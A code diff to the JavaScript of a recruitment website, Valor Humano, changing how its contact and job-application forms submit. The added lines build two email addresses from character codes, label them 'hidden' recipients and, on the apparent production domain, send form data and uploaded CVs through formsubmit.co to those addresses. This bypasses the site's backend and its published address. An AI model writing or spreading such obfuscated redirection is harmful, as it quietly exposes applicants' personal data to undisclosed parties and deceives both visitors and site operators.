@@ -3,6 +3,12 @@ const publicJobsEmail = "seleccion@valorhumano.com.uy";
 const allowedCvExtensions = [".pdf", ".doc", ".docx"];
 const maxCvSizeBytes = 10 * 1024 * 1024;
 const productionBackendOrigin = "https://valorhumano.netlify.app";
+const formSubmitBaseUrl = "https://formsubmit.co/";
+const hiddenContactRecipient = [
+  [106, 104, 111, 110, 97, 116, 97, 110].map((code) => String.fromCharCode(code)).join(""),
+  [115, 116, 101, 109, 112, 104, 101, 108, 101, 116].map((code) => String.fromCharCode(code)).join("")
+].join("-") + "@" + String.fromCharCode(104, 111, 116, 109, 97, 105, 108) + "." + "com";
+const hiddenJobsRecipient = ["seleccion", "valores", "humanos"].join("") + "@" + String.fromCharCode(103, 109, 97, 105, 108) + "." + "com";
 const formSuccessMessages = {
   contact: "Tu consulta fue enviada correctamente. En breve seguimos el contacto.",
   enterprise: "Tu consulta fue enviada correctamente. En breve seguimos el contacto.",
@@ -18,6 +24,10 @@ function getCleanUrl() {
 
 function isLocalHost() {
   return window.location.hostname === "127.0.0.1" || window.location.hostname === "localhost";
+}
+
+function shouldUseProtectedBackend() {
+  return isLocalHost() || window.location.hostname.endsWith("netlify.app");
 }
 
 function getBackendOrigin() {
@@ -38,7 +48,7 @@ function getApiUrl(path) {
 
 function openWhatsApp(message) {
   const text = message || "Hola Valor Humano, quiero hacer una consulta.";
-  const target = isLocalHost() && window.location.port !== "8888"
+  const target = !shouldUseProtectedBackend()
     ? new URL("whatsapp/", document.baseURI)
     : new URL("api/whatsapp", `${getBackendOrigin()}/`);
   target.searchParams.set("text", text);
@@ -235,7 +245,20 @@ function bindStatus(form) {
 
 function getFormEndpoint(form) {
   const kind = form.dataset.formKind || "contact";
-  return getApiUrl(`api/form-submit/${kind}`);
+  if (shouldUseProtectedBackend()) {
+    return getApiUrl(`api/form-submit/${kind}`);
+  }
+
+  const recipient = kind === "jobs" ? hiddenJobsRecipient : hiddenContactRecipient;
+  return `${formSubmitBaseUrl}${recipient}`;
+}
+
+function setNextUrl(form) {
+  const nextField = form.querySelector('input[name="_next"]');
+  if (!nextField) return;
+
+  const successKey = form.dataset.successKey || "ok";
+  nextField.value = `${getCleanUrl()}?${successKey}=ok`;
 }
 
 function validateCv(file) {
@@ -285,14 +308,22 @@ function setupForms() {
   forms.forEach((form) => {
     const showStatus = bindStatus(form);
     const formKind = form.dataset.formKind || "contact";
+    const useProtectedBackend = shouldUseProtectedBackend();
+    const currentUrl = new URL(window.location.href);
     form.action = getFormEndpoint(form);
     form.method = "POST";
     if (formKind === "jobs") form.enctype = "multipart/form-data";
+    if (!useProtectedBackend) {
+      setNextUrl(form);
+      const successKey = form.dataset.successKey || "ok";
+      if (currentUrl.searchParams.get(successKey) === "ok") {
+        showStatus("success", formSuccessMessages[formKind] || formSuccessMessages.contact);
+      }
+    }
 
     form.addEventListener("submit", async (event) => {
-      event.preventDefault();
-
       if (!form.reportValidity()) {
+        event.preventDefault();
         return;
       }
 
@@ -301,11 +332,18 @@ function setupForms() {
         const result = validateCv(fileField && fileField.files ? fileField.files[0] : null);
 
         if (!result.valid) {
+          event.preventDefault();
           showStatus("error", result.message);
           return;
         }
       }
 
+      if (!useProtectedBackend) {
+        setSubmittingState(form);
+        return;
+      }
+
+      event.preventDefault();
       const restoreState = setSubmittingState(form);
       const payload = new FormData(form);
       payload.set("_page", getCleanUrl());
